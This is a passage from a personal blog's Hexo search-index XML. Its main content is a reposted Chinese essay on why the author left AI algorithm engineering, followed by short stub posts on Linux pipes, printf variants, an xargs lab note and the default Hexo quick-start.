href="http://www.fanyeong.com/2019/08/11/why-i-quit-as-a-algorithm-enginer/">http://www.fanyeong.com/2019/08/11/why-i-quit-as-a-algorithm-enginer/</a></p><p>为什么我不再从事算法的工作了？<br>91条回复<br>点击量：11649</p><p>结缘<br>从我2016年接触人工智能到现在已经有三年多的时间了，启蒙学习来自于吴恩达在斯坦福教的那一门CS229机器学习公开课，我当时（2013年）看的并不是现在Coursera上的那一门机器学习课，而是一个画质很模糊的公开课视频。由于画质太渣，有些板书公式的推导看不清楚，似懂非懂。但是，当时就有一个巨大的疑问一直浮现在我的脑海里：“机器到底是如何学习的？”带着这个疑问，2017年开始我就在Coursera开始正儿八经的学习机器学习了，不得不说Coursera上的那门《机器学习》真的很适合入门，比周志华的西瓜书好太多了，学完之后又去学了《深度学习》系列，整体而言难度并不大，用到的数学80%都是高中数学。</p><p>2016年下半年我就有了出国留学的打算，主要想法是工作了两三年觉得重复性的工作太无聊了，没什么激情，想趁着年轻出去看看外面的世界。当时选定的三个国家和地区是香港、新加坡和英国。英国想去的学校（比如帝国理工啥的）学费太高，伦敦地区的租房又很贵，超预算；新加坡的NUS需要考GRE，而且offer来的太晚；而NTU则没有什么好的CS硕士项目；那么很自然地就来到了香港。其实，那时候并没有抱着能学到多少知识的心态去读书的，纯粹是为了向体验一把生活，放松一下。为什么这么说呢？因为你要知道CS相关的工作本来就不太需要硕士学位，一个好点的本科学位足够用了，大学里教授的那些理论知识很多跟实际工作是脱节的，而且现在是互联网时代，你想学什么网上没有呢？对吧。因此择校的时候就很简单，当看到科大宣传片里的无敌海景时我就缴械投降了，心想以后可以每天去学校跑步了，这海景操场实在太美了（事实证明我还是太naive了，科大的workload还是比较重的，基本天天跑图书馆，从来没有去跑过步，当然我们图书馆也很美^V^）。</p><p>HKUST有两个硕士项目，一个是BDT（Big Data Technology），另一个就是弱化版的CS：IT（Information Technology）。BDT是最近几年刚开的一个硕士项目，字面上是大数据，其实学的东西就是现在很火的那一套人工智能的，课程也类似，质量还是比较高的。那时候我也自学了一段时间人工智能，说实话，是有一些想转行的打算的，但当时没有申请BDT，主要还是不够坚决，对人工智能的发展前景看得不是特别清楚，想走一步看一步，于是就很保守地申请了IT。</p><p>后来到了科大之后，除了上IT的课之外，我还去旁听了好多BDT的课，甚至还有些UG的课。整个学习的重心都倾向于人工智能这一块，转行的意愿也约而来越强烈。</p><p>总之呢，通过Coursera的自学和科大的课程，算是把人工智能的整个脉络分支了解的比较透彻了，也诞生了现在的博客。</p><p>毕业时的选择<br>其实，直到2018年六七月份临近毕业找工作时，我对人工智能的发展前景依然不是很明朗，很多公司的招聘要求写的都非常高大上，各种高端的算法名词和工具集合，但他们到底在做什么呢？真的有那么多事情可以做吗？临近毕业时写下了如下的思考：</p><p>今晚看了几集杨澜拍的纪录片《人工智能真的来了》，很有感触。本来是想看看从一个媒体人的视角是如何看待AI的，看完之后发现虽然有那么一点点浮夸，但总体来说还是靠谱的。因为我熟悉各种AI技术的底层原理，所以一直觉得他们还太过愚蠢，根本谈不上智能。也因此，这一两年来我一直在徘徊：有时候觉得当下的AI不过是个巨大的泡沫；有时候仔细想想，又发现AI确实能有很多应用场景。到底是泡沫还是机会？一直举棋不定，直到今晚终于思考出了点眉目。<br>虽说目前的人工智能技术还远远未达到人们所想的那种“智能”的程度，但，不得不说，最近几年，各种新兴技术的发展，尤其是深度学习在几个重点领域取得的重大突破，已经深刻影响到我们生活的方方面面了！比如，语音识别，机器翻译，智能助手，图像识别，目标检测，人脸识别等等领域，机器的能力已经超过人类水平了！而基于以上这些底层技术的整合将会催生出很多有巨大想象空间的技术，最具代表性的就是自动驾驶。这个东西基本就定了，你不要还觉得很科幻，或者还觉得它只是一个实验室产品。因为技术上完全没有问题，剩下的是一些伦理、法规以及各种配套设施在拖后腿。目前来看，国家在政策层面是大力支持的，所以这些问题会很快被一一解决。其实仔细想想，除了自动驾驶还有很多行业是要被AI颠覆的，特别是那种严重依靠经验的职业，最典型的就是医生。大家想想，医生是如何诊断病情的？就是根据你的症状嘛。比如，你发烧，喉咙痛，乏力，流鼻涕；那医生就判断你很可能是感冒了。其实，医生诊断这个行为是一个非常典型的机器学习的过程：通过历史数据去学习一个模型，然后用这个模型去预测新样本。唯一不同的是，医生脑子里的模型是根据他这一生所学的知识以及他的诊断经历来学习得到的，但一个医生一生所能接触到病例数量是非常有限的；而机器则非常不同，它能学习这个世界上所有医生诊断过的所有病例样本，这种数据规模上的碾压使得使得机器在常见病的诊断上一定会做得比某一个医生更好。那为什么我们还没有看到AI在医疗诊断领域的大规模应用？我觉得一个非常大的问题可能是医疗数据的整合是十分困难的，也就是世界各地各大医院的各种医疗数据没有一个统一的标准组织起来，还有是因为一些隐私问题有些医院不愿意公开。但我相信在不久的将来，各国政府一定会推动这件事向前发展。还有一些更容易被取代的职业就不说了，比如收营员，高速公路收费员，股票交易员…<br>以上这两个例子都很美好，那是不是就说明人工智能真的就遍地开花了呢？很遗憾，我个人觉得并不是。<br>现在的AI技术都是大数据驱动的，没有数据扯AI就是挂羊头卖狗肉，忽悠人的，而小公司是很难获取到海量数据的，所以现在这块主要是一些巨头在竞争高地，发布平台，制定标准；还有一些专注于AI的创业公司做的也不错，比如第四范式，waymo等。而对于传统行业或者中小型公司来说，我觉得AI的影响是非常有限的。它并不能像互联网那样对行业产生深刻的变革，它更大的应用价值可能是可以解决一些不痛不痒的隐性业务需求，而这些对一个公司的业绩影响可以说是微不足道的。对公司管理层而言，还是要锚定公司的核心业务，不能盲目跟风，不能为了迎合AI热而去搞AI；对从业者来说，一定要认真思考你去的部门，所做的东西究竟是不是核心业务，到底能不能产生实际价值。否则，等这波潮水退去，这些临时成立的AI部门很可能就解散了。<br>——写于2018年5月6号，大浦仔村，香港</p><p>可以看出这些分析还是比较理性和客观的。</p><p>anyway，毕业回上海还是优先去找了人工智能的工作，差不多把上海大大小小的AI公司都面了个遍，也拿到了两三个offer，最后决定去一家金融科技公司做知识图谱相关的研发工作。</p><p>理想有多么丰满，现实就有多么骨感<br>为什么这么说呢？在这家公司呆了差不多8个月的时间，让我对当下一些高大上的人工智能创业公司有了更深刻的认识。具体地，涉及到很多隐私就不说了。</p><p>最后聊一聊为什么要放弃做算法。当初挤破了头不惜降薪也要进来，现在为什么又要走了呢？</p><p>缺少大规模，高质量的训练数据<br>这几乎是很多小公司的死穴，无解。很多在学术界声称是已经被解决的问题，在工业届依然一筹莫展，为什么？就是因为大部分小公司连一份相对完美的数据集都拿不出来，你训练个啥子？光有牛逼的算法有啥用。<br>技术的局限性<br>除了图像和语音领域的大部分难题被算法攻破，达到了商业落地的标准。其余的都无法达到商业落地的标准，或者说技术实现难度很大（缺少训练语料）。像一些NLP的问题，离完美解决还差十万八千里。你看到的一些看似非常智能的对话机器人要么是像Sophia那种很明显是假的，出来骗人的。要么就是很智障的那种。你对着机器说了一句话，你以为机器理解了你吗？你想多了，它的回复也只是看上去很智能，其实它根本不知道你在说什么。所以我说Elon Mask担心将来AI会使得人类灭绝完全是不懂技术式的杞人忧天，人类现在连自己是怎么思考的都没有弄明白，还谈什么造出来一个有意识的机器人，这不是搞笑吗？人工智能技术看起来高大上，实际上落地非常困难。一方面是很多公司缺少大规模、高质量的训练数据；另一方面是现有技术还没有成熟，13年火热起来的深度学习其实局限性也很大，它就像个黑盒子一样，研究员们只知道输入和输出是什么，但并不知道为什么会这样。以至于现在学术界的深度学习论文都是在比拼网络结构，至于为什么要用这种结构呢？不知道，反正实验结果不错，那就是有效的，然后再找一个看上去很reasonable理由反过来再去解释这个结构。这个其实是很不严谨的，至少在数学上要给出证明它为什么是有效的。所以一切基于深度学习的应用都很难说是安全的，这个问题很大。由于人工智能技术的不完善导致它所能创造的价值其实十分有限，很多岗位其实是不值得设立的，一旦经济形势不好，这批所谓的算法研究员最先下岗。即使在图像、语音这两个技术相对完善的方向也不需要那么多公司，最后只会剩下几家垂直做语音和图像的外包公司，以后AI is a service应该是趋势，也就是说做AI的就那么几家。大部分公司都不会有自己的AI部门，而是寻求外包，这样不仅效果好，成本也低。<br>人工智能究竟能创造多少价值？<br>上面我们说了图像和语音是比较成熟的技术，除此之外的像一些NLP技术其实还很不成熟。比如，我们曾经做过一些命名实体识别的工作，搞了很多复杂的算法，标注了很多数据，最后发现，效果并不比简单规则的方式好多少。另一个例子是模型的准确度，比如一个算法团队辛辛苦苦搞了一个月，嗯，算法模型的准确度提高了1%。看上去不错是吧，在学术界这肯定是可以发一个不错的paper的，但是不好意思，在工业界，如果没有大规模的用户（很多小公司就是这样），这1%的改善所创造的价值几乎为零。然后，你就发现对于一个公司而言，他投入了大量的人力资源，最后产出在哪里？如果你的工作没有创造价值，那你的价值又在哪里呢？<br>算法的技术门槛在降低<br>面试问来问去就那几个问题，问不出个所以然来，问各种算法模型的基本原理，比如让你推导SVM，其实特别像孔乙己中茴香豆有几种写法，实在没什么意思；其次，算法都是公开，主要区别就是数据集，你甚至都不用自己写code，调参都不需要。<br>学历的天花板<br>算法的最大的领导必然是个博士。这几乎是无法改变的学历天花板，而小硕在这个赛道就是打杂的，很难混出什么名堂，何况我还是个授课型的硕士。所以我切换赛道简直就是以己之短博他人之长，毫无胜算，简直是把一手好牌打的稀巴烂啊。<br>市场逐渐饱和<br>饱和的速度远比我当初想象地要快。我16年开始学机器学习的时候觉得人才是非常稀缺地，但是3年后的今天算法工程师已经烂大街了。<br>算法的市场需求太小<br>我没有做过精确的统计，不知道确切的算法和开发的需求比例。但是一个很直观的现象就是：一个公司可以没有算法，但是绝对不能没有开发。所以算法的需求是很低的，这会导致一个很严重的问题：职场机会太少了，跳来跳去就那么几家，这就意味着你跳槽时丧失了议价能力，这是一件很可怕的事情。<br>当然也不是说算法就不能做，而是对于我这个半途出家的Java工程师而言已经没有机会了。一个是出来的太晚了，另一个是需要去大厂的核心算法组历练一段时间才行。目前看来是没有机会了。小公司做算法根本做不出什么东西，而大公司的算法坑位就那么多，想进去太难了。<br>那很多人就说了，你回去写Java就有前途了吗？其实你要明白一件事情：技术本身是没有价值的，只有结合了特定的商业模式才有它的用武之地。决定你发展的，不仅仅是技术本身，还有技术所服务的产品以及你所在的平台。只有产品创造价值了，哪怕你是写简单HTML的，你也能被惠及到，技术的难度并不决定你的发展高度。<br>从更大维度上来说，你最终这辈子能取得多大的成就，首先取决你所在的时代，然后才是你的努力。</p><p>本条目发布于2019年8月11日。属于生活杂绪分类。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 职业规划与发展 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux pipe() 详解</title>
      <link href="/2022/02/26/linux-pipe-xiang-jie/"/>
      <url>/2022/02/26/linux-pipe-xiang-jie/</url>
      
        <content type="html"><![CDATA[<p>自学 MIT 6.S081 操作系统，pipe()讲的不是很明白。参考:<br><a href="https://blog.csdn.net/oguro/article/details/53841949">https://blog.csdn.net/oguro/article/details/53841949</a><br><a href="https://miaochenlu.github.io/2020/12/01/pipe/">https://miaochenlu.github.io/2020/12/01/pipe/</a></p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>printf vs fprintf vs sprintf</title>
      <link href="/2022/02/26/printf-vs-fprintf-vs-sprintf/"/>
      <url>/2022/02/26/printf-vs-fprintf-vs-sprintf/</url>
      
        <content type="html"><![CDATA[<p><a href="https://stackoverflow.com/questions/4627330/difference-between-fprintf-printf-and-sprintf">https://stackoverflow.com/questions/4627330/difference-between-fprintf-printf-and-sprintf</a></p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux pipe() 详解</title>
      <link href="/2022/02/26/mit-6.s081-lab1-xargs/"/>
      <url>/2022/02/26/mit-6.s081-lab1-xargs/</url>
      
        <content type="html"><![CDATA[<p>C语言中，0是字符串输入的结束标志。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>article title</title>
      <link href="/2022/02/26/article-title-1/"/>
      <url>/2022/02/26/article-title-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>article title</title>
      <link href="/2022/02/26/article-title/"/>
      <url>/2022/02/26/article-title/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/02/26/hello-world/"/>
      <url>/2022/02/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建教程</title>
      <link href="/2022/02/25/bo-ke-da-jian-jiao-cheng/"/>
      <url>/2022/02/25/bo-ke-da-jian-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<p>我参考的教程：<br><a href="https://zhuanlan.zhihu.com/p/35668237">https://zhuanlan.zhihu.com/p/35668237</a> (主要)<br><a href="https://www.bilibili.com/read/cv12633102">https://www.bilibili.com/read/cv12633102</a></p><p>使用的主题：<br><a href="https://github.com/jerryc127/hexo-theme-butterfly">https://github.com/jerryc127/hexo-theme-butterfly</a><br>主题教程手册：<br><a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><p>另一个不错的主题可供参考：<br><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md#_configyml-%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%B6%E5%AE%83%E4%BF%AE%E6%94%B9%E5%BB%BA%E8%AE%AE">https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md#_configyml-%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%B6%E5%AE%83%E4%BF%AE%E6%94%B9%E5%BB%BA%E8%AE%AE</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
